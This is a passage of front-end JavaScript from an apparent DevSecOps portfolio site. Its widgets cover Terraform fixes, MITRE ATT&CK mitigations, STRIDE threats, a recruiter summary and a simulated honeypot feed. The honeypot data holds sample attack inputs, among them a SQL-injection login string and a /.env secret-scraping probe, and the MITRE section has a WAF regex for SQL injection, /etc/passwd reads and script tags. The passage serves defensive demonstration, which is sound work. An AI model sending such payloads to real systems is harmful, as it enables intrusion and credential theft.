        "iac_scanner": "tfsec_checkov_engine_v3.2",
        "violations_detected": 2,
        "results": [
          { "rule": "CKV_AWS_24", "severity": "CRITICAL", "desc": "Security group rule allows unrestricted ingress from 0.0.0.0/0 on port 22." },
          { "rule": "CKV_AWS_23", "severity": "MEDIUM", "desc": "Security group has no egress restriction defined." }
        ]
      },
      remediated: `resource "aws_security_group" "bastion_ssh_hardened" {
  name        = "bastion-ssh-hardened"
  description = "Zero-Trust VPN Bastion SSH"
  vpc_id      = aws_vpc.main.id

  ingress {
    description = "Restricted to internal corporate WireGuard VPN CIDR"
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["10.0.0.0/16"]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["10.0.0.0/16"]
  }

  tags = {
    Compliance = "CIS-AWS-Networking-4.1"
  }
}`
    },
    eks_public: {
      raw: `resource "aws_eks_cluster" "production" {
  name     = "haqueandsons-prod-eks"
  role_arn = aws_iam_role.cluster.arn

  vpc_config {
    subnet_ids              = [aws_subnet.pub_1.id, aws_subnet.pub_2.id]
    endpoint_public_access  = true # DANGEROUS: Public API endpoint enabled
  }
}`,
      findings: {
        "iac_scanner": "tfsec_checkov_engine_v3.2",
        "violations_detected": 2,
        "results": [
          { "rule": "CKV_AWS_39", "severity": "HIGH", "desc": "Ensure AWS EKS cluster has secrets envelope encryption enabled via KMS key." },
          { "rule": "CKV_AWS_38", "severity": "HIGH", "desc": "Ensure AWS EKS control plane API endpoint is restricted to private VPC." }
        ]
      },
      remediated: `resource "aws_eks_cluster" "production_hardened" {
  name     = "haqueandsons-prod-eks"
  role_arn = aws_iam_role.cluster.arn

  vpc_config {
    subnet_ids              = [aws_subnet.priv_1.id, aws_subnet.priv_2.id]
    endpoint_public_access  = false
    endpoint_private_access = true
  }

  encryption_config {
    provider {
      key_arn = aws_kms_key.eks_secrets_key.arn
    }
    resources = ["secrets"]
  }

  enabled_cluster_log_types = ["api", "audit", "authenticator", "controllerManager", "scheduler"]
}`
    },
    clean: {
      raw: `# Hardened CIS-Compliant AWS KMS & IAM Definition
resource "aws_kms_key" "app_secrets" {
  description             = "Envelope encryption key for EKS & S3 secrets"
  deletion_window_in_days = 30
  enable_key_rotation     = true
  multi_region            = false

  tags = {
    Compliance = "CIS-AWS-KMS-3.8"
    ManagedBy  = "Terraform"
  }
}`,
      findings: {
        "iac_scanner": "tfsec_checkov_engine_v3.2",
        "violations_detected": 0,
        "compliance_score": "100%",
        "status": "PASSED_ALL_CIS_BENCHMARKS"
      },
      remediated: `# Code is already 100% compliant with CIS AWS Foundations Benchmark!`
    }
  };

  let currentTfScenario = "s3_public";
  if (tfInput) tfInput.value = TF_PRESETS.s3_public.raw;

  tfChips.forEach(chip => {
    chip.addEventListener("click", () => {
      tfChips.forEach(c => c.classList.remove("active"));
      chip.classList.add("active");
      currentTfScenario = chip.dataset.tf;
      if (tfInput && TF_PRESETS[currentTfScenario]) {
        tfInput.value = TF_PRESETS[currentTfScenario].raw;
        CyberAudio.play("click");
      }
    });
  });

  function runTfScan() {
    if (!tfOutput) return;
    const data = TF_PRESETS[currentTfScenario];
    if (!data) return;

    if (currentTfScenario === "clean") {
      if (tfStatusBox) tfStatusBox.className = "intercept-status";
      if (tfStatusTitle) tfStatusTitle.textContent = "IaC Benchmark: 100% Clean";
      if (tfStatusDesc) tfStatusDesc.textContent = "All AWS CIS Foundation rules passed. No misconfigurations detected.";
      CyberAudio.play("success");
    } else {
      if (tfStatusBox) tfStatusBox.className = "intercept-status blocked";
      if (tfStatusTitle) tfStatusTitle.textContent = `IaC Policy Alert: ${data.findings.violations_detected} Violations`;
      if (tfStatusDesc) tfStatusDesc.textContent = "Critical security gaps detected in Terraform code. Click 'Auto-Remediate' to fix.";
      CyberAudio.play("alert");
    }

    tfOutput.innerHTML = `<code>${JSON.stringify(data.findings, null, 2)}</code>`;
  }

  function autoRemediateTf() {
    if (!tfInput) return;
    const data = TF_PRESETS[currentTfScenario];
    if (!data) return;

    tfInput.value = data.remediated;
    if (tfStatusBox) tfStatusBox.className = "intercept-status";
    if (tfStatusTitle) tfStatusTitle.textContent = "Remediation Applied: Compliant HCL";
    if (tfStatusDesc) tfStatusDesc.textContent = "Automated CIS benchmark refactoring complete. Code is hardened and ready for PR merge.";
    if (tfOutput) tfOutput.innerHTML = `<code>// Clean scan result: 0 violations remaining. Ready for CI/CD deployment!</code>`;
    CyberAudio.play("success");
  }

  if (runTfScanBtn) runTfScanBtn.addEventListener("click", runTfScan);
  if (autoRemediateBtn) autoRemediateBtn.addEventListener("click", autoRemediateTf);
})();

// ============================================================
//  FEATURE: ZERO-TRUST CLOUD ARCHITECTURE DIAGRAM
// ============================================================
(function initCloudArchitecture() {
  const cards = document.querySelectorAll(".arch-zone-card");
  const inspTitle = document.getElementById("inspTitle");
  const inspContent = document.getElementById("inspContent");
  const breachBtn = document.getElementById("simulateBreachBtn");
  if (cards.length === 0 || !inspContent) return;

  const ZONE_INFO = {
    edge: {
      title: "Zone 01 · Edge & Ingress Perimeter",
      rows: [
        { label: "WAF Rule Engine:", val: "AWS WAF with OWASP Top 10 Core Rule Set (CRS)" },
        { label: "TLS Hardening:", val: "TLS 1.3 Strict with HSTS (max-age=31536000; includeSubDomains)" },
        { label: "Rate Limiting:", val: "Threshold of 500 req/min per IP with token bucket throttling" },
        { label: "DDoS Mitigation:", val: "AWS Shield Standard + Cloudflare Anycast BGP Routing" }
      ]
    },
    dmz: {
      title: "Zone 02 · Ingress Gateway & Bastion (DMZ)",
      rows: [
        { label: "Host Protection:", val: "Sentinel Daemon tailing auth.log with auto-iptables kernel drop" },
        { label: "Network Isolation:", val: "Public Subnet CIDR 10.0.1.0/24 with 0 direct DB routes" },
        { label: "SSH Configuration:", val: "Port 22 disabled, Ed25519 Keys only, PasswordAuthentication no" },
        { label: "OS Hardening:", val: "CIS Linux Level 2 Benchmark compliance with AppArmor profiles" }
      ]
    },
    k8s: {
      title: "Zone 03 · Private Compute (EKS Cluster)",
      rows: [
        { label: "Pod Security:", val: "Non-root execution (runAsNonRoot: true, readOnlyRootFilesystem)" },
        { label: "Network Policies:", val: "Default Deny-All ingress/egress with Calico policy enforcement" },
        { label: "Service Mesh:", val: "Istio mTLS with automatic SPIFFE/SPIRE cryptographic identity" },
        { label: "Vulnerability Scan:", val: "Trivy admission controller blocking images with CRITICAL CVEs" }
      ]
    },
    persistence: {
      title: "Zone 04 · Data Persistence & Cryptography",
      rows: [
        { label: "Secrets Engine:", val: "HashiCorp Vault with dynamic rotating PostgreSQL credentials (1h TTL)" },
        { label: "Data Encryption:", val: "AWS KMS Customer Managed Keys (CMK) with envelope encryption (AES-256-GCM)" },
        { label: "Subnet Routing:", val: "Isolated Private Subnet (10.0.20.0/24) with 0 Internet Gateway access" },
        { label: "Audit Trail:", val: "Immutable write-once S3 access logs with AWS CloudTrail correlation" }
      ]
    }
  };

  function updateInspector(zoneKey) {
    const data = ZONE_INFO[zoneKey];
    if (!data) return;
    if (inspTitle) inspTitle.textContent = data.title;
    inspContent.innerHTML = data.rows.map(r => `
      <div class="insp-row">
        <span class="insp-label">${r.label}</span>
        <span class="insp-val">${r.val}</span>
      </div>
    `).join("");
  }

  cards.forEach(card => {
    card.addEventListener("click", () => {
      cards.forEach(c => c.classList.remove("active"));
      card.classList.add("active");
      updateInspector(card.dataset.zone);
      CyberAudio.play("click");
    });
  });

  // Default initialize Zone 1
  updateInspector("edge");

  // Simulate Ingress Breach
  if (breachBtn) {
    let isSimulating = false;
    breachBtn.addEventListener("click", async () => {
      if (isSimulating) return;
      isSimulating = true;
      breachBtn.disabled = true;
      breachBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Simulating Attack Packet...';
      CyberAudio.play("laser");

      const zoneKeys = ["edge", "dmz", "k8s", "persistence"];
      for (let i = 0; i < zoneKeys.length; i++) {
        const key = zoneKeys[i];
        const card = document.querySelector(`.arch-zone-card[data-zone="${key}"]`);
        cards.forEach(c => c.classList.remove("active", "breach-sim"));
        if (card) {
          card.classList.add("active", "breach-sim");
          updateInspector(key);
        }
        CyberAudio.play("alert");
        await new Promise(r => setTimeout(r, 900));
      }

      cards.forEach(c => c.classList.remove("breach-sim"));
      CyberAudio.play("success");
      breachBtn.disabled = false;
      breachBtn.innerHTML = '<i class="fa-solid fa-shield-virus"></i> Simulate Ingress Attack';
      isSimulating = false;
    });
  }
})();

// ============================================================
//  FEATURE: MITRE ATT&CK MATRIX NAVIGATOR
// ============================================================
(function initMitreMatrix() {
  const cards = document.querySelectorAll(".mitre-card");
  const inspId = document.getElementById("mitreInspId");
  const inspTitle = document.getElementById("mitreInspTitle");
  const inspTool = document.getElementById("mitreInspTool");
  const inspBody = document.getElementById("mitreInspBody");
  if (cards.length === 0 || !inspBody) return;

  const MITRE_DATA = {
    t1110: {
      id: "T1110 · Initial Access",
      title: "Brute Force (SSH & Password Spraying)",
      tool: "Sentinel Daemon",
      desc: "Adversaries attempt to gain access by systematically guessing passwords or using credential lists against SSH and web endpoints.",
      mitigation: "Sentinel Daemon continuously tails /var/log/auth.log, extracts candidate attacker IPs via rolling regex matching, and executes kernel-level iptables DROP commands in <2ms.",
      rule: "iptables -I INPUT -s [ATTACKER_IP] -p tcp --dport 22 -j DROP -m comment --comment 'Sentinel Auto-Ban'"
    },
    t1190: {
      id: "T1190 · Initial Access",
      title: "Exploit Public-Facing Application",
      tool: "Threat Log Parser & WAF",
      desc: "Adversaries scan public web applications for unpatched vulnerabilities (SQL Injection, Log4Shell, RCE) to execute arbitrary commands.",
      mitigation: "Threat Intelligence Log Parser flags anomalous URI patterns, cross-references IPs against threat feeds, and dispatches real-time alerts to the firewall gateway.",
      rule: "SEC_RULE: regex_match('(?i)(union.*select|/etc/passwd|<script>)') -> ACTION: HTTP_403_BLOCK"
    },
    t1059: {
      id: "T1059 · Execution",
      title: "Command and Scripting Interpreter",
      tool: "Semgrep SAST & AppArmor",
      desc: "Adversaries leverage command interpreters (Bash, Python, sh) to execute malicious post-exploitation commands on the target host.",
      mitigation: "Pre-commit static analysis enforces strict least privilege. AppArmor restricts daemon processes from spawning unapproved child shells (/bin/sh).",
      rule: "semgrep --config 'p/security-audit' --error --exclude 'tests/'"
    },
    t1070: {
      id: "T1070 · Defense Evasion",
      title: "Indicator Removal on Host (Log Tampering)",
      tool: "Digital Forensics & Auditing",
      desc: "Adversaries attempt to delete, overwrite, or corrupt audit logs (auth.log, syslogs) to hide their intrusion footprints.",
      mitigation: "Drawing from UP Police Cyber Forensics experience, audit logs are set to append-only (chattr +a) and streamed to an immutable remote store.",
      rule: "chattr +a /var/log/auth.log && systemctl restart rsyslog"
    },
    t1552: {
      id: "T1552 · Credential Access",
      title: "Unsecured Credentials in Code & Configs",
      tool: "GitShield Pre-Commit Hook",
      desc: "Adversaries search git repositories, environment files, and container layers for hardcoded private keys and API tokens.",
      mitigation: "GitShield intercepts every git commit before staging, computing character Shannon entropy and blocking high-entropy strings or key headers.",
      rule: "git config --local core.hooksPath .githooks && gitshield --scan-staged"
    },
    t1046: {
      id: "T1046 · Discovery",
      title: "Network Service Discovery (Port Scanning)",
      tool: "Sentinel Port-Scan Probe",
      desc: "Adversaries scan for open listening ports across the host to locate vulnerable daemon versions and misconfigured services.",
      mitigation: "TCP SYN packets hitting closed or non-standard ports trigger rate-limited quarantine rules that shadow-drop the probing source.",
      rule: "iptables -A INPUT -p tcp --tcp-flags SYN,ACK,FIN,RST SYN -m limit --limit 1/s -j ACCEPT"
    }
  };

  function updateMitre(key) {
    const d = MITRE_DATA[key];
    if (!d) return;
    if (inspId) inspId.textContent = d.id;
    if (inspTitle) inspTitle.textContent = d.title;
    if (inspTool) inspTool.textContent = d.tool;
    inspBody.innerHTML = `
      <p><strong>Threat Description:</strong> ${d.desc}</p>
      <p style="margin-top:0.4rem"><strong>Mitigation in Nejamul's Stack:</strong> ${d.mitigation}</p>
      <div class="mitre-rule-box"><code>${d.rule}</code></div>
    `;
  }

  cards.forEach(card => {
    card.addEventListener("click", () => {
      cards.forEach(c => c.classList.remove("active"));
      card.classList.add("active");
      updateMitre(card.dataset.tech);
      CyberAudio.play("click");
    });
  });

  // Default initialize T1110
  updateMitre("t1110");
})();

// ============================================================
//  FEATURE: RECRUITER & HIRING MANAGER EXECUTIVE DOSSIER
// ============================================================
(function initRecruiterDossier() {
  const btn = document.getElementById("recruiterModeBtn");
  const backdrop = document.getElementById("recruiterBackdrop");
  const closeBtn = document.getElementById("recruiterClose");
  const resumeBtn = document.getElementById("dossierResumeBtn");
  const copyBtn = document.getElementById("dossierCopySummaryBtn");
  const contactLink = document.getElementById("dossierContactLink");
  if (!btn || !backdrop) return;

  function openDossier() {
    backdrop.classList.add("open");
    CyberAudio.play("blip");
  }
  function closeDossier() {
    backdrop.classList.remove("open");
  }

  btn.addEventListener("click", openDossier);
  if (closeBtn) closeBtn.addEventListener("click", closeDossier);
  backdrop.addEventListener("click", (e) => {
    if (e.target === backdrop) closeDossier();
  });

  if (resumeBtn) {
    resumeBtn.addEventListener("click", () => {
      window.print();
    });
  }

  if (contactLink) {
    contactLink.addEventListener("click", closeDossier);
  }

  if (copyBtn) {
    copyBtn.addEventListener("click", () => {
      const summary = `CANDIDATE DOSSIER: Nejamul Haque (DevSecOps & Cloud Security Engineer)
Target Window: 2026–2027 Internship / Full-Time Placement (B.Tech CSE, 2023–2027)
Portfolio: https://nejamulhaque.github.io/devsecops-portfolio/
GitHub: https://github.com/NejamulHaque | LinkedIn: https://linkedin.com/in/NejamulHaque
Startup / Testbed: https://haqueandsons.vercel.app

KEY DIFFERENTIATORS:
1. Law Enforcement Cyber Security Intern @ UP Police (APCSIP-2026) - Digital Forensics & Host Defense.
2. Full-Stack Developer & Startup Founder @ Haque And Sons (Shipped 3 production SaaS apps - React/Next.js/PostgreSQL).
3. Custom Security Tooling Engineer:
   - KubeShield: Dynamic Kubernetes Admission Controller enforcing CIS benchmarks.
   - GitSLSA: SLSA Level 3 Supply Chain Security with Cosign keyless image signing & SPDX SBOMs.
   - Sentinel Daemon: Autonomous kernel iptables firewall daemon (<2ms drop latency).
   - GitShield: Pre-commit Shannon entropy secret interception engine.

CORE COMPETENCIES: Kubernetes Security & PSS, CI/CD Pipeline Hardening, Linux Kernel Defense (iptables/eBPF), Software Supply Chain Security (SLSA/SBOM), STRIDE & MITRE Threat Modeling.`;

      navigator.clipboard.writeText(summary).then(() => {
        copyBtn.innerHTML = '<i class="fa-solid fa-check"></i> Summary Copied!';
        CyberAudio.play("success");
        setTimeout(() => {
          copyBtn.innerHTML = '<i class="fa-solid fa-copy"></i> Copy Recruiter Summary';
        }, 2000);
      });
    });
  }
})();

// ============================================================
//  FEATURE: PRODUCTION INCIDENT POST-MORTEM TIMELINE
// ============================================================
(function initPostMortem() {
  const steps = document.querySelectorAll(".step-card");
  if (steps.length === 0) return;

  steps.forEach(step => {
    step.addEventListener("click", () => {
      steps.forEach(s => s.classList.remove("active"));
      step.classList.add("active");
      CyberAudio.play("click");
    });
  });
})();

// ============================================================
//  FEATURE: DEVSECOPS MATURITY & ROI CALCULATOR
// ============================================================
(function initMaturityCalculator() {
  const cloudChips = document.querySelectorAll("#calcCloudChips .calc-chip");
  const checkboxes = document.querySelectorAll(".calc-check input[type='checkbox']");
  const gradeCircle = document.getElementById("gradeCircle");
  const gradeLetter = document.getElementById("gradeLetter");
  const gradeScore = document.getElementById("gradeScore");
  const gradeLabel = document.getElementById("gradeLabel");
  const gradeSummary = document.getElementById("gradeSummary");
  const roiVuln = document.getElementById("roiVulnReduction");
  const roiSecret = document.getElementById("roiSecretBreach");
  const roiHours = document.getElementById("roiHoursSaved");
  const blueprint = document.getElementById("hardeningBlueprintText");
  if (!gradeLetter || !blueprint) return;

  let selectedCloud = "k8s";

  cloudChips.forEach(chip => {
    chip.addEventListener("click", () => {
      cloudChips.forEach(c => c.classList.remove("active"));
      chip.classList.add("active");
      selectedCloud = chip.dataset.cloud;
      recalcMaturity();
      CyberAudio.play("click");
    });
  });

  checkboxes.forEach(chk => {
    chk.addEventListener("change", () => {
      recalcMaturity();
      CyberAudio.play("blip");
    });
  });

  function recalcMaturity() {
    let score = 25; // Base score
    let checkedCount = 0;

    const hasSecret = document.getElementById("chkPreCommit")?.checked;
    const hasSast = document.getElementById("chkSast")?.checked;
    const hasSca = document.getElementById("chkSca")?.checked;
    const hasContainer = document.getElementById("chkContainer")?.checked;
    const hasDast = document.getElementById("chkDast")?.checked;
    const hasKernel = document.getElementById("chkKernel")?.checked;

    if (hasSecret) { score += 15; checkedCount++; }
    if (hasSast) { score += 15; checkedCount++; }
    if (hasSca) { score += 12; checkedCount++; }
    if (hasContainer) { score += 15; checkedCount++; }
    if (hasDast) { score += 10; checkedCount++; }
    if (hasKernel) { score += 13; checkedCount++; }

    // Cloud bonus/penalty adjustments
    if (selectedCloud === "k8s" && !hasContainer) score -= 8;
    if (selectedCloud === "linux" && hasKernel) score += 5;

    score = Math.max(15, Math.min(100, score));

    // Determine Letter Grade
    let letter = "D";
    let label = "High Exposure Risk";
    let summaryText = "Crucial automated security gates are missing. The pipeline is vulnerable to hardcoded secrets and unvetted container CVEs.";
    let vulnRed = "-30%";
    let secretRisk = "HIGH";
    let hoursSaved = "~3 hrs/wk";

    if (score >= 90) {
      letter = "A+";
      label = "Production Enterprise Hardened";
      summaryText = "Comprehensive defense-in-depth across pre-commit, CI/CD static gates, container admission, and automated host kernel defense.";
      vulnRed = "-94%";
      secretRisk = "0 Leaks";
      hoursSaved = "~18 hrs/wk";
    } else if (score >= 75) {
      letter = "B+";
      label = "Strong Shift-Left Posture";
      summaryText = "Solid automated pre-commit and static code checks in place. Reinforce container isolation and live host firewalling for top-tier defense.";
      vulnRed = "-82%";
      secretRisk = "0 Leaks";
      hoursSaved = "~14 hrs/wk";
    } else if (score >= 55) {
      letter = "C";
      label = "Basic Security Baseline";
      summaryText = "Minimal static checks present. High residual risk of third-party dependency CVEs and lateral host exploitation.";
      vulnRed = "-55%";
      secretRisk = "Moderate";
      hoursSaved = "~8 hrs/wk";
    }

    if (gradeLetter) gradeLetter.textContent = letter;
    if (gradeScore) gradeScore.textContent = `${score} / 100`;
    if (gradeLabel) gradeLabel.textContent = label;
    if (gradeSummary) gradeSummary.textContent = summaryText;
    if (roiVuln) roiVuln.textContent = vulnRed;
    if (roiSecret) roiSecret.textContent = secretRisk;
    if (roiHours) roiHours.textContent = hoursSaved;

    // Custom remediation advice
    const missing = [];
    if (!hasSecret) missing.push("GitShield pre-commit secret interceptor");
    if (!hasSast) missing.push("Semgrep SAST rule engine");
    if (!hasSca) missing.push("Trivy dependency SCA");
    if (!hasContainer) missing.push("non-root container hardening");
    if (!hasKernel) missing.push("Sentinel Daemon auto-firewall");

    if (missing.length === 0) {
      blueprint.innerHTML = "Pipeline is fully hardened across all stages. Ready for <strong>SLSA Level 3</strong> attestation and compliance audits.";
    } else {
      blueprint.innerHTML = `Immediate priority: integrate <strong>${missing.slice(0, 2).join("</strong> and <strong>")}</strong> to elevate defense posture.`;
    }
  }

  recalcMaturity();
})();

// ============================================================
//  FEATURE: ENTERPRISE CIS & NIST COMPLIANCE SCORECARD
// ============================================================
(function initComplianceScorecard() {
  const cards = document.querySelectorAll(".comp-card");
  const titleEl = document.getElementById("compDetailTitle");
  const contentEl = document.getElementById("compDetailContent");
  if (cards.length === 0 || !contentEl) return;

  const COMP_DATA = {
    cis: {
      title: "CIS Linux Benchmark (Level 2 Hardened Profile)",
      rows: [
        { label: "sshd Hardening:", val: "PasswordAuthentication no, PermitRootLogin no, X11Forwarding no" },
        { label: "Filesystem Isolation:", val: "Separate /tmp mount with nodev, nosuid, and noexec options" },
        { label: "Access Control:", val: "AppArmor enforced on all network-facing daemons (enforce mode)" },
        { label: "Audit Logging:", val: "auditd rules capturing all execve syscalls, chmod/chown, and /etc/shadow" }
      ]
    },
    pss: {
      title: "Kubernetes Pod Security Standards (Restricted Baseline)",
      rows: [
        { label: "User Isolation:", val: "runAsNonRoot: true, runAsUser: 10001 (0 root execution allowed)" },
        { label: "Filesystem:", val: "readOnlyRootFilesystem: true with ephemeral emptyDir for scratch" },
        { label: "Linux Capabilities:", val: "capabilities.drop: ['ALL'] (zero ambient kernel capabilities)" },
        { label: "Network Policy:", val: "Calico Default-Deny ingress/egress with explicit whitelist rules" }
      ]
    },
    slsa: {
      title: "SLSA Level 3 Supply Chain Security Provenance",
      rows: [
        { label: "Image Signing:", val: "Cosign keyless signing with Sigstore Fulcio OIDC certificate authority" },
        { label: "SBOM Generation:", val: "Automated Syft / Trivy SPDX SBOM generated at build time" },
        { label: "Build Integrity:", val: "Isolated ephemeral GitHub Actions runners with strict SLSA attestations" },
        { label: "Vulnerability Gate:", val: "Zero promotion to production if CRITICAL/HIGH CVEs exist" }
      ]
    },
    nist: {
      title: "NIST SP 800-53 Rev. 5 Security Controls Mapping",
      rows: [
        { label: "AC-3 (Access Enforcement):", val: "Enforced via iptables kernel drop + SSH Ed25519 key-only bastion" },
        { label: "SC-7 (Boundary Protection):", val: "Enforced via AWS WAF + Subnet isolation + Sentinel Daemon" },
        { label: "SI-4 (System Monitoring):", val: "Enforced via Threat Log Parser with automated SIEM JSON export" },
        { label: "AU-2 (Event Logging):", val: "Enforced via append-only auth.log with cryptographic integrity checks" }
      ]
    }
  };

  function updateComp(key) {
    const d = COMP_DATA[key];
    if (!d) return;
    if (titleEl) titleEl.textContent = d.title;
    contentEl.innerHTML = d.rows.map(r => `
      <div class="comp-row">
        <span class="comp-label">${r.label}</span>
        <span class="comp-val">${r.val}</span>
      </div>
    `).join("");
  }

  cards.forEach(card => {
    card.addEventListener("click", () => {
      cards.forEach(c => c.classList.remove("active"));
      card.classList.add("active");
      updateComp(card.dataset.comp);
      CyberAudio.play("click");
    });
  });

  // Default initialize CIS
  updateComp("cis");
})();

// ============================================================
//  FEATURE: STRIDE DATA FLOW DIAGRAM (DFD) EXPLORER
// ============================================================
(function initStrideDfd() {
  const nodes = document.querySelectorAll(".dfd-node");
  const titleEl = document.getElementById("dfdNodeTitle");
  const tagEl = document.getElementById("dfdBoundaryTag");
  const gridEl = document.getElementById("dfdStrideGrid");
  if (nodes.length === 0 || !gridEl) return;

  const DFD_DATA = {
    client: {
      title: "01. Web / Mobile Client (Untrusted External Entity)",
      boundary: "Trust Boundary: Public Internet ➔ Cloudflare Edge",
      items: [
        { threat: "Spoofing / Impersonation", desc: "Attacker attempts credential brute force or session hijacking.", mit: "Mitigated via Argon2id password hashing + HTTP-only Secure SameSite JWT tokens." },
        { threat: "Tampering / MITM", desc: "Attacker attempts to intercept or modify payloads in transit.", mit: "Mitigated via Strict TLS 1.3 encryption with HSTS preload." },
        { threat: "Information Disclosure", desc: "Attacker scrapes client-side state or exposed tokens in URL parameters.", mit: "Mitigated via GitShield pre-commit scan + CSP script-src 'self' header policy." }
      ]
    },
    edge: {
      title: "02. Cloudflare & AWS WAF (Edge Perimeter)",
      boundary: "Trust Boundary: Edge CDN ➔ Kubernetes Ingress Gateway",
      items: [
        { threat: "Denial of Service (DoS)", desc: "Layer 7 volumetric HTTP floods targeting backend API endpoints.", mit: "Mitigated via Cloudflare Anycast DDoS protection + IP sliding-window rate limiters." },
        { threat: "Tampering / SQLi & XSS", desc: "Malformed SQL, XSS, or path traversal strings passed in query/body.", mit: "Mitigated via WAF OWASP Top 10 Core Rule Set + Threat Log Parser SIEM correlation." },
        { threat: "Elevation of Privilege", desc: "Adversary probes unpublished admin routes or actuator debug endpoints.", mit: "Mitigated via Edge firewall rules restricting /admin & internal paths to VPN CIDR." }
      ]
    },
    ingress: {
      title: "03. Ingress NGINX Gateway (K8s API Boundary)",
      boundary: "Trust Boundary: DMZ Gateway ➔ Private Microservice Pods",
      items: [
        { threat: "Spoofing / Unauthenticated Ingress", desc: "Bypassing edge proxies to connect directly to node ports.", mit: "Mitigated via Kubernetes Calico NetworkPolicies enforcing ingress only from WAF CIDRs." },
        { threat: "Repudiation / Unaudited Routing", desc: "Adversary makes malicious API calls with no persistent audit record.", mit: "Mitigated via Structured JSON access logging with remote syslog streaming." },
        { threat: "Information Disclosure", desc: "Server headers leaking NGINX version or internal cluster IP addresses.", mit: "Mitigated via server_tokens off and custom sanitized error response pages." }
      ]
    },
    app: {
      title: "04. Application Pods (Haque And Sons Microservices)",
      boundary: "Trust Boundary: Container Runtime ➔ Kernel Syscalls",
      items: [
        { threat: "Elevation / Container Escape", desc: "Vulnerability exploited to escape container into host root namespace.", mit: "Mitigated via KubeShield non-root UID 10001 + eBPF kernel SIGKILL probes." },
        { threat: "Tampering / Supply Chain Poisoning", desc: "Compromised third-party npm/pip package executed during runtime.", mit: "Mitigated via GitSLSA Cosign keyless image verification + Syft SPDX SBOM gates." },
        { threat: "Information Disclosure", desc: "Hardcoded API keys or database passwords baked into container layers.", mit: "Mitigated via HashiCorp Vault dynamic ephemeral secrets injected into tmpfs." }
      ]
    },
    data: {
      title: "05. PostgreSQL & HashiCorp Vault (Data Store)",
      boundary: "Trust Boundary: App Namespace ➔ Encrypted Storage Engine",
      items: [
        { threat: "Information Disclosure / Dump", desc: "Unauthorized database queries or disk snapshot theft.", mit: "Mitigated via AES-256 encryption at rest + strict database role isolation." },
        { threat: "Tampering / Data Mutation", desc: "Direct database record tampering without application audit trace.", mit: "Mitigated via Append-only immutable transaction audit logs." },
        { threat: "Elevation / Master Key Theft", desc: "Compromising root credentials or persistent tokens.", mit: "Mitigated via Vault Shamir's Secret Sharing with automated 15-minute lease expiration." }
      ]
    }
  };

  function updateDfd(key) {
    const d = DFD_DATA[key];
    if (!d) return;
    if (titleEl) titleEl.textContent = d.title;
    if (tagEl) tagEl.textContent = d.boundary;
    gridEl.innerHTML = d.items.map(item => `
      <div class="dfd-stride-item">
        <strong>${item.threat}</strong>
        <p>${item.desc}</p>
        <span class="mitigation">🛡️ <strong>Mitigation:</strong> ${item.mit}</span>
      </div>
    `).join("");
  }

  nodes.forEach(node => {
    node.addEventListener("click", () => {
      nodes.forEach(n => n.classList.remove("active"));
      node.classList.add("active");
      updateDfd(node.dataset.node);
      CyberAudio.play("click");
    });
  });

  // Default initialize client node
  updateDfd("client");
})();

// ============================================================
//  FEATURE: SSH & API HONEYPOT DECEPTION TELEMETRY STREAM
// ============================================================
(function initHoneypotStream() {
  const streamList = document.getElementById("hpStreamList");
  const countEl = document.getElementById("hpEventCount");
  const titleEl = document.getElementById("hpProbeTitle");
  const bodyEl = document.getElementById("hpDetailBody");
  if (!streamList || !bodyEl) return;

  const PROBES = [
    {
      target: "POST /wp-login.php",
      ip: "194.26.29.114 (NL)",
      time: "Just now",
      payload: "log=admin&pwd=%27+OR+1%3D1--&wp-submit=Log+In",
      headers: "User-Agent: Mozilla/5.0 (Hydra-WP/v2.1)\nHost: decoy-eu-west-1.sentinel-grid.net\nContent-Type: application/x-www-form-urlencoded",
      analysis: "Automated credential stuffing probe against decoy WordPress login trap.",
      action: "iptables -I INPUT -s 194.26.29.114 -j DROP # TTL: 3600s"
    },
    {
      target: "GET /.env",
      ip: "45.155.205.233 (RU)",
      time: "14s ago",
      payload: "GET /.env HTTP/1.1",
      headers: "User-Agent: Go-http-client/1.1\nHost: decoy-us-east-1.sentinel-grid.net\nAccept: */*",
      analysis: "Mass automated environment file scraper looking for AWS_SECRET_ACCESS_KEY.",
      action: "iptables -I INPUT -s 45.155.205.233 -j DROP # Decoy Canary Token Triggered"
    },
    {
      target: "SSH 2222 root auth",
      ip: "185.220.101.32 (DE)",
      time: "28s ago",
      payload: "SSH-2.0-libssh2_1.9.0 | User: root | Pass: password123",
      headers: "Port: 2222 (Decoy Cowrie SSH Honeypot)\nCipher: aes256-ctr\nKex: curve25519-sha256",
      analysis: "Botnet dictionary attack on decoy SSH port. Keystrokes & session recordings archived.",
      action: "iptables -I INPUT -s 185.220.101.32 -j DROP # Attacker IP Feed Sync"
    },
    {
      target: "POST /actuator/env",
      ip: "103.149.28.18 (IN)",
      time: "42s ago",
      payload: "POST /actuator/env HTTP/1.1",
      headers: "User-Agent: masscan/1.3.2\nHost: decoy-ap-south-1.sentinel-grid.net",
      analysis: "Reconnaissance targeting unauthenticated Spring Boot actuator properties.",
      action: "iptables -I INPUT -s 103.149.28.18 -j DROP # SIEM Event Logged"
    },
    {
      target: "GET /phpmyadmin/index.php",
      ip: "198.51.100.99 (US)",
      time: "1m ago",
      payload: "GET /phpmyadmin/index.php?lang=en HTTP/1.1",
      headers: "User-Agent: ZGrab/2.0\nHost: decoy-us-east-1.sentinel-grid.net",
      analysis: "Automated vulnerability scanner probing legacy database administrative interfaces.",
      action: "iptables -I INPUT -s 198.51.100.99 -j DROP # Rate-Limit Quarantine"
    }
  ];

  function renderProbeDetail(probe) {
    if (titleEl) titleEl.textContent = `${probe.target} · ${probe.ip}`;
    bodyEl.innerHTML = `
      <div style="display:flex; flex-direction:column; gap:0.6rem; font-family:var(--fm); font-size:0.75rem;">
        <div><strong style="color:var(--accent);">Attacker Headers:</strong><pre class="siem-output" style="margin-top:0.2rem; padding:0.5rem;"><code>${probe.headers}</code></pre></div>
        <div><strong style="color:var(--accent-warm);">Intercepted Payload:</strong><pre class="siem-output" style="margin-top:0.2rem; padding:0.5rem;"><code>${probe.payload}</code></pre></div>
        <div><strong style="color:var(--text);">Forensic Assessment:</strong> <span style="color:var(--muted);">${probe.analysis}</span></div>
        <div style="background:rgba(0,255,157,0.06); padding:0.5rem 0.8rem; border-radius:6px; border:1px solid rgba(0,255,157,0.2);">
          <strong style="color:var(--accent-3);">Automated Kernel Defense Action:</strong><br>
          <code style="color:var(--accent-3);">${probe.action}</code>
        </div>
